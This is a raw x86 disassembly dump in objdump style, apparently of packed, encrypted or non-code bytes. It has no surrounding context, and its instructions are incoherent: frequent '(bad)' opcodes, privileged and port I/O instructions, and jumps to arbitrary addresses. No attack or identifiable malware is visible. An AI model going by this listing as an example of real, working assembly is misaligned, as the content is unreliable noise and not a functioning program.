  42aa48:	sub    BYTE PTR [edi],0xe0
  42aa4b:	mov    dl,0x2f
  42aa4d:	daa    
  42aa4e:	mov    eax,ds:0x85361b74
  42aa53:	and    eax,0x7852e21
  42aa58:	pusha  
  42aa59:	add    dh,BYTE PTR [ebp+0x37005014]
  42aa5f:	or     eax,0xa8d95efa
  42aa64:	and    al,0xf1
  42aa66:	dec    esp
  42aa67:	inc    edi
  42aa68:	mov    edi,0x248834b9
  42aa6d:	add    BYTE PTR [edi],bh
  42aa6f:	sti    
  42aa70:	ins    DWORD PTR es:[edi],dx
  42aa71:	and    al,0x5f
  42aa73:	cld    
  42aa74:	ins    DWORD PTR es:[edi],dx
  42aa75:	and    al,0x67
  42aa77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42aa78:	or     esi,0xfff211a3
  42aa7e:	inc    esp
  42aa7f:	xor    BYTE PTR [esi],dl
  42aa81:	mov    ecx,edi
  42aa83:	mov    bl,0x18
  42aa85:	shrd   DWORD PTR [edi],edx,0x4a
  42aa89:	(bad)  
  42aa8a:	out    dx,eax
  42aa8b:	mov    bl,0x34
  42aa8d:	(bad)  
  42aa8e:	jg     0x42aa44
  42aa90:	and    al,0xff
  42aa92:	outs   dx,DWORD PTR ds:[esi]
  42aa93:	mov    ah,0x2c
  42aa95:	push   ecx
  42aa96:	or     BYTE PTR [ebx-0x1e],0xec
  42aa9a:	call   0x1bcea199
  42aa9f:	lea    ecx,[ebp+0x24]
  42aaa2:	iret   
  42aaa3:	cs sbb al,0x8b
  42aaa6:	pop    ecx
  42aaa8:	sbb    BYTE PTR [edi],cl
  42aaaa:	in     al,dx
  42aaab:	sbb    DWORD PTR [edx-0x1],ecx
  42aaae:	jg     0x42aa71
  42aab0:	xor    al,0xff
  42aab2:	outs   dx,DWORD PTR ds:[esi]
  42aab3:	shl    DWORD PTR [edi+edi*8],0x6f
  42aab7:	shr    DWORD PTR [ecx+edx*2],0x40
  42aabb:	dec    esi
  42aabc:	loop   0x42ab1d
  42aabe:	hlt    
  42aabf:	cli    
  42aac0:	test   BYTE PTR [ebx+0x3d8cdb00],0x24
  42aac7:	(bad)  
  42aac8:	pusha  
  42aac9:	int3   
  42aaca:	ud0    eax,DWORD PTR [eax-0x711b0005]
  42aad1:	cmp    eax,0x558e9f24
  42aad6:	and    al,0x8b
  42aad8:	push   esi
  42aad9:	mov    edx,0x3b19780c
  42aade:	mov    DWORD PTR [edi],ecx
  42aae0:	mov    bl,0x24
  42aae2:	mov    DWORD PTR [edi],edx
  42aae4:	mov    bl,0x10
  42aae6:	jmp    0xfb33dd4d
  42aaeb:	inc    ebp
  42aaec:	js     0x42ab57
  42aaee:	and    al,0x8a
  42aaf0:	add    BYTE PTR es:[ebp-0x17],bl
  42aaf4:	mov    ebx,0xb7f0d5
  42aaf9:	inc    BYTE PTR [esi+0x57515c1f]
  42aaff:	or     edi,edi
  42ab01:	shl    BYTE PTR cs:[edi+edi*2-0x2dfb03f],0xfd
  42ab0a:	dec    esi
  42ab0b:	push   eax
  42ab0c:	(bad)  
  42ab0d:	(bad)  
  42ab0e:	add    edx,DWORD PTR [ebx]
  42ab10:	jmp    0x7404:0xc1ecbeeb
  42ab17:	cmc    
  42ab18:	ja     0x42ab5b
  42ab1a:	and    al,0x5a
  42ab1c:	push   edx
  42ab1d:	jge    0x42ab24
  42ab1f:	jmp    0x5300:0x5ebe47d8
  42ab26:	push   edx
  42ab27:	add    BYTE PTR ds:0x5a664c96,dh
  42ab2d:	enter  0xfb54,0x77
  42ab31:	enter  0x446b,0x62
  42ab35:	xchg   esi,edx
  42ab37:	xchg   BYTE PTR [ebx+0x52fc1243],ch
  42ab3d:	rol    BYTE PTR [edi+eax*4],0x92
  42ab41:	jge    0x42ab35
  42ab43:	or     bl,dh
  42ab45:	xchg   ebp,edi
  42ab47:	jmp    DWORD PTR [edx+0x79]
  42ab4a:	sub    ah,BYTE PTR [edx-0x27]
  42ab4d:	mov    ch,0x4
  42ab4f:	(bad)  
  42ab50:	jmp    0x42ab0c
  42ab52:	cld    
  42ab53:	or     ch,BYTE PTR [ebp+0x304f08b5]
  42ab59:	cmp    BYTE PTR [bp+di+0x3e],0x24
  42ab5e:	(bad)  
  42ab5f:	popa   
  42ab60:	jmp    0x42ab3a
  42ab62:	test   eax,0xbb5568f9
  42ab67:	add    ah,BYTE PTR [edx-0x27]
  42ab6a:	mov    bh,0xfc
  42ab6c:	adc    BYTE PTR [ebx+0xa9153df],dl
  42ab72:	fucom  st(7)
  42ab74:	gs cdq 
  42ab76:	out    0x86,eax
  42ab78:	in     eax,dx
  42ab79:	test   dh,cl
  42ab7b:	push   ebx
  42ab7c:	mov    edx,0x6203e8c1
  42ab81:	or     bl,BYTE PTR [edi+eiz*1+0x17a25c76]
  42ab88:	mov    dl,0x5c
  42ab8a:	mov    esp,0x5e3e0027
  42ab8f:	sbb    ebx,esp
  42ab91:	cdq    
  42ab92:	mov    eax,ds:0xd6fd03e7
  42ab97:	mov    dh,0xc3
  42ab99:	ficom  DWORD PTR [edx-0x265a7929]
  42ab9f:	arpl   WORD PTR [esi],sp
  42aba1:	arpl   cx,bx
  42aba3:	out    0x78,eax
  42aba5:	pop    ecx
  42aba6:	mov    ch,0xf3
  42aba8:	gs in  eax,0x91
  42abab:	loope  0x42ac12
  42abad:	mov    ds:0xf3fce700,eax
  42abb2:	and    BYTE PTR [eax+0x45],dh
  42abb5:	jb     0x42ab91
  42abb7:	jb     0x42abfe
  42abb9:	pop    edx
  42abba:	fiadd  DWORD PTR [edx-0x24652545]
  42abc0:	cmc    
  42abc1:	mov    ds:0x15061bd5,al
  42abc6:	clc    
  42abc7:	fwait
  42abc8:	and    BYTE PTR [edx+0x563d60d4],0x5f
  42abcf:	and    edi,esi
  42abd1:	out    dx,al
  42abd2:	call   0x79e9:0x616a59c7
  42abd9:	and    bl,bl
  42abdb:	add    BYTE PTR [ecx+0x1f],ah
  42abde:	mov    eax,0xe7a7a758
  42abe3:	add    bh,cl
  42abe5:	mov    BYTE PTR [edx+ecx*1-0x6c2b8e2d],bl
  42abec:	sub    ecx,ecx
  42abee:	call   0x73da:0x8d00b31d
  42abf5:	mov    edi,0xef424c36
  42abfa:	(bad)  
  42abfb:	sar    BYTE PTR [esi+0x1424dbc],1
  42ac01:	lods   eax,DWORD PTR ds:[esi]
  42ac02:	popa   
  42ac03:	fnstcw WORD PTR [ebx+0xd96209]
  42ac09:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  42ac0b:	mov    ebp,0xd961f614
  42ac10:	add    BYTE PTR [edx],al
  42ac12:	pop    eax
  42ac13:	mov    al,bh
  42ac15:	leave  
  42ac16:	ins    BYTE PTR es:[edi],dx
  42ac17:	in     eax,dx
  42ac18:	mov    bh,0xe9
  42ac1a:	popa   
  42ac1b:	add    al,0x1
  42ac1d:	xor    al,0x61
  42ac1f:	add    al,0x1
  42ac21:	jmp    0xfd6748cc
  42ac26:	enter  0xfa08,0xe9
  42ac2a:	lods   al,BYTE PTR ds:[esi]
  42ac2b:	fadd   DWORD PTR [ebp-0x7a127dd3]
  42ac31:	sbb    eax,0x5585ed82
  42ac36:	sub    ch,0x87
  42ac39:	and    eax,0x2f8bed82
  42ac3e:	inc    esp
  42ac3f:	test   eax,0xf142178b
  42ac44:	shl    DWORD PTR [edi+0x278c0389],0x6d
  42ac4b:	test   eax,0x60403f8b
  42ac50:	int3   
  42ac51:	or     edi,0xfa02
  42ac57:	fmul   QWORD PTR [eax-0x7e68dbbb]
  42ac5d:	aas    
  42ac5e:	sub    al,0x4b
  42ac60:	or     BYTE PTR [edi+0x28],0xe3
  42ac64:	gs clc 
  42ac66:	(bad)  
  42ac67:	mov    esp,0x31204782
  42ac6c:	in     al,dx
  42ac6d:	push   edx
  42ac6e:	push   edx
  42ac6f:	or     al,BYTE PTR [ecx+0x23fb313f]
  42ac75:	scas   al,BYTE PTR es:[edi]
  42ac76:	je     0x42acc3
  42ac78:	fadd   QWORD PTR ds:0x705fdb7
  42ac7e:	scas   eax,DWORD PTR es:[edi]
  42ac7f:	std    
  42ac80:	(bad)  
  42ac82:	ror    bl,0x83
  42ac85:	aas    
  42ac86:	xor    al,0x91
  42ac88:	fwait
  42ac89:	xor    BYTE PTR [eax-0x367c633b],cl
  42ac8f:	out    0x7,al
  42ac91:	sub    eax,eax
  42ac93:	pusha  
  42ac94:	(bad)  
  42ac96:	cs ja  0x42ac75
  42ac99:	add    BYTE PTR [ecx-0x3f7c2c3b],cl
  42ac9f:	addr16 aad 0xf5
  42aca2:	jbe    0x42ac5f
  42aca4:	repnz das 
  42aca6:	call   esi
  42aca8:	pop    ds
  42aca9:	or     al,BYTE PTR [eax-0x45]
  42acac:	add    dh,BYTE PTR [eax+0x641c36db]
  42acb2:	add    DWORD PTR [edx-0x66],eax
  42acb5:	add    al,0x58
  42acb7:	lods   al,BYTE PTR ds:[esi]
  42acb8:	cwde   
  42acb9:	fmul   DWORD PTR [ebx+0x3123fc00]
  42acbf:	je     0x42ac7c
  42acc1:	fild   DWORD PTR [ebx+ebx*8+0x76f5ef56]
  42acc8:	fwait
  42acc9:	repnz adc al,0xd8
  42accc:	mov    ebx,DWORD PTR [ebx+0x40628b00]
  42acd2:	(bad)  
  42acd3:	sbb    al,0xf6
  42acd5:	icebp  
  42acd6:	std    
  42acd7:	cs ins BYTE PTR es:[edi],dx
  42acd9:	mov    bh,BYTE PTR [edi+0x47e80d56]
  42acdf:	mov    esi,0x874ff25a
  42ace4:	push   ebx
  42ace5:	js     0x42ad56
  42ace7:	add    al,0x55
  42ace9:	out    0xe5,eax
  42aceb:	adc    al,0x2e
  42aced:	add    DWORD PTR [esi],edi
  42acef:	add    BYTE PTR [ebp+0x27],al
  42acf2:	push   cs
  42acf3:	sti    
  42acf4:	push   edi
  42acf5:	enter  0x400d,0x62
  42acf9:	mov    esi,DWORD PTR [edi]
  42acfb:	sbb    al,0x3a
  42acfd:	les    esi,FWORD PTR [edx+0x0]
  42ad00:	bound  edi,QWORD PTR [ebx+0x37]
  42ad03:	sbb    BYTE PTR [edx],cl
  42ad05:	pushf  
  42ad06:	jb     0x42ad08
  42ad08:	bound  ecx,QWORD PTR [ebx-0x2c05bbc9]
  42ad0e:	jb     0x42ad10
  42ad10:	bound  edi,QWORD PTR [ebx-0x49]
  42ad13:	pop    ecx
  42ad14:	or     ecx,esp
  42ad16:	jb     0x42ad18
  42ad18:	bound  esp,QWORD PTR [ecx+0x55]
  42ad1b:	dec    edi
  42ad1c:	xchg   edi,eax
  42ad1d:	outs   dx,BYTE PTR ds:[esi]
  42ad1e:	dec    edi
  42ad1f:	xchg   DWORD PTR [eax],eax
  42ad21:	clc    
  42ad22:	gs jge 0x42ad70
  42ad25:	xchg   BYTE PTR [eax],ch
  42ad27:	out    0x14,eax
  42ad29:	jb     0x42ad2e
  42ad2b:	ds add cl,bl
  42ad2e:	sbb    BYTE PTR [esi+esi*8-0x1d],bh
  42ad32:	pop    ss
  42ad33:	add    eax,0x7cf0bd00
  42ad38:	out    dx,al
  42ad39:	jmp    0x63202ba1
  42ad3e:	inc    edi
  42ad3f:	add    eax,0x5b3bd900
  42ad44:	add    BYTE PTR [ebx-0x7c3eeaba],ah
  42ad4a:	fincstp 
  42ad4c:	cld    
  42ad4d:	mov    edx,DWORD PTR [edx+0x14]
  42ad50:	and    BYTE PTR [edx-0x2e],ch
  42ad53:	mov    eax,0x2454665e
  42ad58:	and    BYTE PTR [edx+0x18],bl
  42ad5b:	xchg   ah,bh
  42ad5d:	mov    ds:0x5d53eff6,al
  42ad62:	add    ebx,DWORD PTR [edx]
  42ad64:	jnp    0x42ad3f
  42ad66:	mov    ebp,0xc16ee8c7
  42ad6b:	stc    
  42ad6c:	inc    ebx
  42ad6d:	bound  ebx,QWORD PTR [edx+0x60]
  42ad70:	add    bh,cl
  42ad72:	out    dx,eax
  42ad73:	ins    BYTE PTR es:[edi],dx
  42ad74:	int    0xb1
  42ad76:	xlat   BYTE PTR ds:[ebx]
  42ad77:	mov    dh,0x7c
  42ad79:	push   cs
  42ad7a:	push   edx
  42ad7b:	xor    bl,ah
  42ad7d:	jp     0x42ad50
  42ad7f:	cmp    ch,cl
  42ad81:	loope  0x42ad9b
  42ad83:	mov    esp,0xd7cd00ff
  42ad88:	ds push es
  42ad8a:	inc    ebp
  42ad8b:	sbb    ebx,eax
  42ad8d:	dec    ecx
  42ad8e:	scas   eax,DWORD PTR es:[edi]
  42ad8f:	mov    ds:0x57c54ac0,al
  42ad94:	add    al,0x94
  42ad96:	inc    DWORD PTR ds:0x528f54e8
  42ad9c:	aad    0x2b
  42ad9e:	push   eax
  42ad9f:	cdq    
  42ada0:	out    0x51,eax
  42ada2:	xchg   ecx,eax
  42ada3:	retf   0x550e
  42ada6:	inc    esp
  42ada7:	aad    0x5e
  42ada9:	jmp    0x42ade8
  42adab:	inc    ecx
  42adac:	xchg   DWORD PTR [ebx+0x62],eax
  42adaf:	scas   al,BYTE PTR es:[edi]
  42adb0:	jo     0x42ae19
  42adb2:	jle    0x42ad55
  42adb4:	ror    dh,cl
  42adb6:	cmp    al,0x1
  42adb8:	fdiv   st(0),st
  42adba:	fisub  WORD PTR [esi]
  42adbc:	lock add esp,DWORD PTR [edx+0x71]
  42adc0:	daa    
  42adc1:	jno    0x42ae10
  42adc3:	fld    DWORD PTR [eax]
  42adc5:	sbb    DWORD PTR ds:0x172924aa,edx
  42adcb:	adc    ebp,ecx
  42adcd:	sti    
  42adce:	bound  eax,QWORD PTR [edx]
  42add0:	cli    
  42add1:	mov    eax,gs:0x79ac84d2
  42add7:	add    eax,0xa16203fa
  42addc:	push   eax
  42addd:	sbb    DWORD PTR [ebp+ebx*1+0x545e299e],edi
  42ade4:	dec    ebp
  42ade5:	int    0xa1
  42ade7:	icebp  
  42ade8:	pop    edi
  42ade9:	pushf  
  42adea:	add    BYTE PTR [ecx-0x27],ah
  42aded:	sub    DWORD PTR [ecx],0x4a
  42adf0:	pop    esi
  42adf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42adf2:	icebp  
  42adf3:	popa   
  42adf4:	(bad)  [ebx-0x7418a243]
  42adfa:	popf   
  42adfb:	push   ebp
  42adfc:	lds    ecx,FWORD PTR [eax-0x773fb25b]
  42ae02:	popf   
  42ae03:	inc    ebp
  42ae04:	(bad)  
  42ae05:	call   0xfa47c795
  42ae0a:	pop    esp
  42ae0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ae0c:	mov    ebp,0xbd557411
  42ae11:	inc    eax
  42ae12:	adc    esp,edx
  42ae14:	fadd   QWORD PTR [eax]
  42ae16:	jmp    0xc58ff915
  42ae1b:	push   edx
  42ae1c:	shl    BYTE PTR [edx+0x62e74dad],1
  42ae22:	sub    BYTE PTR [eax],al
  42ae24:	frstor [edx-0x1e]
  42ae27:	sbb    eax,edx
  42ae29:	mov    cl,0x28
  42ae2b:	aam    0x5
  42ae2d:	std    
  42ae2e:	out    0xc5,al
  42ae30:	inc    ecx
  42ae31:	add    edx,ebp
  42ae33:	popa   
  42ae34:	fldenv [edx+0x12]
  42ae37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ae38:	iret   
  42ae39:	or     DWORD PTR [eax-0x4a],0x3200fa04
  42ae40:	xchg   ecx,eax
  42ae41:	and    al,0x28
  42ae43:	xor    BYTE PTR [ecx+0x1e],dl
  42ae46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ae47:	mov    eax,ebx
  42ae49:	add    BYTE PTR [ebp-0x74d746c1],cl
  42ae4f:	add    BYTE PTR [eax-0x60ab7458],dl
  42ae55:	mov    eax,0xb8af44bd
  42ae5a:	(bad)  
  42ae5b:	dec    DWORD PTR [ebx+0x7f53f5d8]
  42ae61:	jg     0x42aea8
  42ae63:	and    al,0x87
  42ae65:	jg     0x42ae37
  42ae67:	mov    ecx,DWORD PTR [edx]
  42ae69:	push   ds
  42ae6a:	loop   0x42ae7c
  42ae6c:	retf   0xf9f7
  42ae6f:	inc    esp
  42ae71:	fld    QWORD PTR [ecx]
  42ae73:	rcl    al,1
  42ae75:	push   ds
  42ae76:	and    eax,0xdd9400
  42ae7b:	shr    DWORD PTR [edx+0x7ac101ed],0xfd
  42ae82:	add    DWORD PTR [ebx],esi
  42ae84:	ins    DWORD PTR es:[edi],dx
  42ae85:	xchg   ebx,eax
  42ae86:	bound  eax,QWORD PTR [edx+ecx*2]
  42ae89:	pop    ds
  42ae8a:	add    cl,BYTE PTR [ebx]
  42ae8c:	jnp    0x42ae23
  42ae8e:	push   eax
  42ae8f:	lea    edi,[edi-0x33afcb1d]
  42ae95:	test   BYTE PTR [ebp+0x24],cl
  42ae98:	pop    ss
  42ae99:	sti    
  42ae9a:	aam    0x8b
  42ae9c:	xlat   BYTE PTR ds:[ebx]
  42ae9d:	jecxz  0x42aebb
  42ae9f:	xor    DWORD PTR [ecx],0xfffffffc
  42aea2:	jp     0x42ae9c
  42aea4:	dec    DWORD PTR [edx]
  42aea6:	inc    ebp
  42aea7:	retf   0xc142
  42aeaa:	and    al,0x1c
  42aeac:	mov    al,ds:0x9984074d
  42aeb1:	add    bh,dl
  42aeb3:	inc    DWORD PTR [eax]
  42aeb5:	xchg   edx,eax
  42aeb6:	or     al,0x85
  42aeb8:	out    0x62,al
  42aeba:	repz std 
  42aebc:	dec    DWORD PTR [edx-0x4e]
  42aebf:	imul   edx,DWORD PTR [edi],0x8d03a862
  42aec5:	push   cs
  42aec6:	fiadd  WORD PTR [edx]
  42aec8:	xchg   DWORD PTR [ebp-0x6afdf2e7],ebp
  42aece:	xor    bh,BYTE PTR [edx-0x41]
  42aed1:	pop    ebp
  42aed2:	jbe    0x42ae85
  42aed4:	add    ah,BYTE PTR [edx-0xe]
  42aed7:	jge    0x42af54
  42aed9:	inc    esi
  42aeda:	add    al,0xfe
  42aedc:	xchg   BYTE PTR [ecx+0x23],ch
  42aedf:	xchg   ecx,eax
  42aee0:	mov    ebp,0x83fcde6d
  42aee5:	mov    ds:0x65b279f2,al
  42aeea:	lock std 
  42aeec:	xchg   BYTE PTR [ecx-0x5b],ch
  42aeef:	jns    0x42af14
  42aef1:	jmp    0x4975:0xb2fffdf0
  42aef8:	and    al,0x9a
  42aefa:	jns    0x42af65
  42aefc:	and    al,0x9a
  42aefe:	xchg   ebx,eax
  42aeff:	dec    esi
  42af00:	or     al,0xe7
  42af02:	mov    al,0xf2
  42af04:	or     eax,0xfffffffb
  42af07:	std    
  42af08:	push   DWORD PTR [ebx-0x39dc5635]
  42af0e:	out    dx,al
  42af0f:	std    
  42af10:	(bad)  
  42af11:	fild   WORD PTR [ecx+ebx*1-0x20f9d60]
  42af18:	xchg   BYTE PTR [eax],al
  42af1a:	sub    bl,cl
  42af1c:	add    eax,0x76d3f5fc
  42af21:	xlat   BYTE PTR ds:[ebx]
  42af22:	out    0xb7,eax
  42af24:	repnz sub DWORD PTR [eax-0x5],0xfffffffd
  42af29:	(bad)  
  42af2a:	fld    QWORD PTR [ecx+ebx*1+0xe2dd554]
  42af31:	mov    cr3,ecx
  42af34:	out    0x5d,eax
  42af36:	frstor [esi-0x710c0b11]
  42af3c:	loopne 0x42af9b
  42af3e:	mov    ds:0x655ddff7,eax
  42af43:	sub    BYTE PTR [edx+0x7b],cl
  42af46:	adc    DWORD PTR [ebp-0x591aa1cd],edi
  42af4c:	(bad)  
  42af4e:	ror    DWORD PTR [esi-0x85ca222],cl
  42af54:	out    dx,eax
  42af55:	pop    ebp
  42af56:	pop    ebp
  42af57:	sub    BYTE PTR [edi-0xc],ch
  42af5a:	add    edx,DWORD PTR [eax+0x3c]
  42af5d:	and    al,dh
  42af5f:	pop    ss
  42af60:	adc    BYTE PTR [eiz*8+0x65e2692b],0x2
  42af68:	jnp    0x42af6e
  42af6a:	gs sub esi,edi
  42af6d:	adc    ebx,ebp
  42af6f:	adc    ch,BYTE PTR [ecx+0x2a4e5de3]
  42af75:	pop    ds
  42af76:	bound  eax,QWORD PTR [edx]
  42af78:	call   0xb0541480
  42af7d:	push   ebx
  42af7e:	add    bl,ch
  42af80:	pushf  
  42af81:	add    esi,DWORD PTR [eax-0x21]
  42af84:	xchg   ebp,eax
  42af85:	pop    es
  42af86:	push   esp
  42af87:	and    edi,eax
  42af89:	out    dx,eax
  42af8a:	ret    0xd107
  42af8d:	(bad)  
  42af8f:	out    0x5c,al
  42af91:	add    al,0x84
  42af93:	or     eax,0xdb53e802
  42af98:	ins    BYTE PTR es:[edi],dx
  42af99:	les    ecx,FWORD PTR [edi-0x2417fe03]
  42af9f:	int    0x87
  42afa1:	out    0x3,eax
  42afa3:	sbb    BYTE PTR [eax],0xac
  42afa6:	pop    ds
  42afa7:	shl    WORD PTR [esi+0x7b2dc3],1
  42afae:	sub    dl,ah
  42afb0:	mov    ch,0x7e
  42afb2:	jmp    0x534b8918
  42afb7:	push   esi
  42afb8:	push   esp
  42afb9:	inc    ebp
  42afba:	add    eax,0x6dbf774a
  42afbf:	push   ebp
  42afc0:	push   ecx
  42afc1:	add    ecx,ebp
  42afc3:	popa   
  42afc4:	rcl    DWORD PTR [eax+0x1e],1
  42afc7:	mov    edi,0x69c17e2c
  42afcc:	into   
  42afcd:	sub    DWORD PTR [eax+0x64fa0197],0x7f
  42afd4:	test   DWORD PTR [edx+esi*2],edx
  42afd7:	adc    eax,0xfb3754bd
  42afdc:	push   cs
  42afdd:	jmp    0xfa41249c
  42afe2:	add    BYTE PTR gs:[ecx+0x675084ce],ah
  42afe9:	add    edx,edi
  42afeb:	jb     0x42b061
  42afed:	jne    0x42b001
  42afef:	sub    DWORD PTR [esi+0x43],ebx
  42aff2:	cli    
  42aff3:	outs   dx,BYTE PTR ds:[esi]
  42aff4:	popa   
  42aff5:	fldcw  WORD PTR ds:0x8819cb30
  42affb:	aad    0x5d
  42affd:	mov    cl,0xba
  42afff:	push   esi
  42b000:	popa   
  42b001:	fld    DWORD PTR [eax]
  42b003:	mov    bh,0xa9
  42b005:	pushf  
  42b006:	and    al,0xe2
  42b008:	test   eax,0xb0f5249c
  42b00d:	dec    esi
  42b00e:	test   DWORD PTR ds:0xe9fa00f6,ecx
  42b014:	mov    cl,0x1c
  42b016:	inc    ebp
  42b017:	int    0x3c
  42b019:	add    al,0xfa
  42b01b:	push   ds
  42b01c:	push   es
  42b01d:	add    al,0xd4
  42b01f:	fisub  DWORD PTR [ecx]
  42b021:	stos   DWORD PTR es:[edi],eax
  42b022:	push   eax
  42b023:	pop    esp
  42b024:	ins    DWORD PTR es:[edi],dx
  42b025:	mov    esp,0xdcfa00b4
  42b02a:	add    BYTE PTR [eax-0x24],dl
  42b02d:	push   cs
  42b02e:	jnp    0x42aff4
  42b030:	mov    bl,0xc9
  42b032:	(bad)  
  42b033:	mov    ebp,DWORD PTR [edx-0x7d]
  42b036:	dec    ebp
  42b037:	and    al,0x63
  42b039:	dec    esi
  42b03a:	inc    esi
  42b03b:	and    al,0xbf
  42b03d:	adc    edi,DWORD PTR [esi]
  42b03f:	and    al,0x1f
  42b041:	int    0x0
  42b043:	add    BYTE PTR [ebx+0x24a64f],bh
  42b049:	xlat   BYTE PTR ds:[ebx]
  42b04a:	xlat   BYTE PTR ds:[ebx]
  42b04b:	add    BYTE PTR [eax],al
  42b04d:	push   es
  42b04e:	inc    edi
  42b04f:	pop    es
  42b050:	test   BYTE PTR [ebp+0x6a0000d5],ch
  42b056:	(bad)  
  42b057:	push   0xdc7a2c
  42b05c:	lea    ecx,[edi-0x4f]
  42b05f:	push   esp
  42b060:	call   0x3884c3
  42b065:	clc    
  42b066:	sbb    al,0xf7
  42b068:	psadbw mm2,mm5
  42b06b:	(bad)  
  42b06c:	dec    DWORD PTR [ebx-0x5]
  42b06f:	adc    al,0xcc
  42b071:	ss pushf 
  42b073:	add    BYTE PTR ds:0xb46f,bh
  42b079:	dec    esp
  42b07a:	push   ecx
  42b07b:	add    eax,0x79dc4b06
  42b080:	mov    esp,0xfffc6567
  42b085:	cmp    ebx,esp
  42b087:	je     0x42b098
  42b089:	adc    ebx,edi
  42b08b:	div    BYTE PTR [edi+eiz*2+0xbfffc61]
  42b092:	sti    
  42b093:	adc    al,0x88
  42b095:	sub    DWORD PTR [eax+eax*1-0xa243175],ebx
  42b09c:	push   ebp
  42b09d:	sti    
  42b09e:	dec    esi
  42b09f:	dec    esi
  42b0a0:	and    al,0x62
  42b0a2:	or     cl,BYTE PTR [ebx+0x133a467b]
  42b0a8:	leave  
  42b0a9:	fild   DWORD PTR [ebp+0x22]
  42b0ac:	pop    eax
  42b0ad:	add    bh,ah
  42b0af:	jecxz  0x42b0be
  42b0b1:	test   bh,ch
  42b0b3:	icebp  
  42b0b4:	std    
  42b0b5:	(bad)  
  42b0b6:	fnstenv ds:0x20d91c22
  42b0bc:	mov    esp,ebp
  42b0be:	jmp    0x42b065
  42b0c0:	sub    BYTE PTR [ecx+ecx*2],ch
  42b0c3:	adc    eax,0x97bdff0d
  42b0c8:	sbb    ecx,DWORD PTR [edx+0x5f]
  42b0cb:	shl    BYTE PTR [ebx+0x62],0x5b
  42b0cf:	mov    al,0x5
  42b0d1:	jb     0x42b10c
  42b0d3:	loopne 0x42b05e
  42b0d5:	into   
  42b0d6:	fstp   DWORD PTR [esi-0x1a]
  42b0d9:	out    dx,al
  42b0da:	(bad)  
  42b0db:	fistp  QWORD PTR ss:[esi+0x7a]
  42b0df:	pop    esi
  42b0e0:	je     0x409dc8
  42b0e6:	out    0x31,eax
  42b0e8:	je     0x409dd8
  42b0ee:	loope  0x42b148
  42b0f0:	add    eax,0x417b9375
  42b0f5:	and    al,0xaa
  42b0f7:	jnp    0x42b142
  42b0f9:	and    al,0x6a
  42b0fb:	xor    BYTE PTR [ebx],bl
  42b0fd:	shl    DWORD PTR [edi+0x477f4d05],0xfa
  42b104:	mov    WORD PTR [ebx-0x7a],cs
  42b107:	or     BYTE PTR [ebx+0x2244d7d4],cl
  42b10d:	sbb    al,0xa
  42b10f:	fldcw  WORD PTR [ebp+0x0]
  42b112:	add    BYTE PTR [edx-0x65],ah
  42b115:	push   cs
  42b116:	pop    bx
  42b118:	add    edi,DWORD PTR [esi+0x22d9ac4f]
  42b11e:	clc    
  42b11f:	and    edi,0x157503a7
  42b125:	in     al,0x8e
  42b127:	xchg   ecx,eax
  42b128:	mov    ch,0xef
  42b12a:	mov    fs,WORD PTR [ecx-0x54e91c4b]
  42b130:	push   edx
  42b131:	je     0x42b15a
  42b133:	cmp    bl,BYTE PTR [edx-0x54]
  42b136:	daa    
  42b137:	jle    0x42b109
  42b139:	mov    eax,ds:0x3fb5518c
  42b13e:	sbb    eax,0x285452cc
  42b143:	xchg   BYTE PTR [ebx-0x4a067298],cl
  42b149:	add    DWORD PTR [esi],0x62
  42b14c:	fldenv [esi-0x60]
  42b14f:	inc    ecx
  42b150:	dec    ecx
  42b151:	out    0x3,al
  42b153:	(bad)  
  42b154:	(bad)  
  42b156:	xchg   DWORD PTR [ebx-0x771e5501],edx
  42b15c:	inc    ebp
  42b15d:	int3   
  42b15e:	xchg   ebx,eax
  42b15f:	jg     0x42b15f
  42b161:	out    0xe0,eax
  42b163:	dec    esi
  42b164:	leave  
  42b165:	test   BYTE PTR [ebx+0x62],0x52
  42b169:	xor    al,0x28
  42b16b:	dec    edx
  42b16c:	retf   0xebb0
  42b16f:	cmp    edi,edi
  42b171:	jp     0x42b154
  42b173:	fdivr  QWORD PTR [ebx+ecx*8+0x4b]
  42b177:	add    BYTE PTR [edx+0x45fcf299],bh
  42b17d:	jo     0x42b167
  42b17f:	mov    ss,WORD PTR [ecx+0x288cf9b5]
  42b185:	icebp  
  42b186:	mov    ebp,0x63fe2904
  42b18b:	les    ebx,FWORD PTR [eax+0x55]
  42b18e:	cmp    ecx,DWORD PTR [eax]
  42b190:	(bad)  
  42b191:	fldl2e 
  42b193:	cdq    
  42b194:	mov    eax,ds:0x76df00b5
  42b199:	or     esp,DWORD PTR [esi]
  42b19b:	daa    
  42b19c:	jae    0x42b1f3
  42b19e:	ds in  eax,dx
  42b1a0:	popa   
  42b1a1:	fldenv [esi-0x15]
  42b1a4:	cmp    BYTE PTR [esi-0x121a1941],dh
  42b1aa:	(bad)  
  42b1ab:	call   0x6d4c4311
  42b1b0:	xor    edi,edi
  42b1b2:	stc    
  42b1b3:	jmp    0xfc783e1
  42b1b8:	popa   
  42b1b9:	fld    DWORD PTR [eax]
  42b1bb:	mov    eax,ds:0xe9b55572
  42b1c0:	popa   
  42b1c1:	(bad)  [eax-0x12]
  42b1c4:	fcomp  QWORD PTR [eax]
  42b1c6:	add    eax,0x414361e9
  42b1cb:	push   esi
  42b1cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b1cd:	std    
  42b1ce:	push   ebx
  42b1cf:	push   ebx
  42b1d0:	addr16 dec esp
  42b1d2:	xchg   ebp,eax
  42b1d3:	add    eax,0xe9f9fde2
  42b1d8:	ficom  WORD PTR [edx]
  42b1da:	jmp    0x2a0b2b6
  42b1df:	cli    
  42b1e0:	ins    DWORD PTR es:[edi],dx
  42b1e1:	mov    eax,ds:0x5d4a84d2
  42b1e6:	fld    DWORD PTR [eax]
  42b1e8:	aas    
  42b1e9:	cld    
  42b1ea:	aam    0x58
  42b1ec:	cmp    ebp,edx
  42b1ee:	test   eax,0xfef1d24
  42b1f3:	jmp    0xfa431177
  42b1f8:	ins    DWORD PTR es:[edi],dx
  42b1f9:	and    eax,edx
  42b1fb:	test   BYTE PTR [edx+0x5d],ah
  42b1fe:	fld    DWORD PTR [eax]
  42b200:	jb     0x42b1af
  42b202:	mov    ch,0x4c
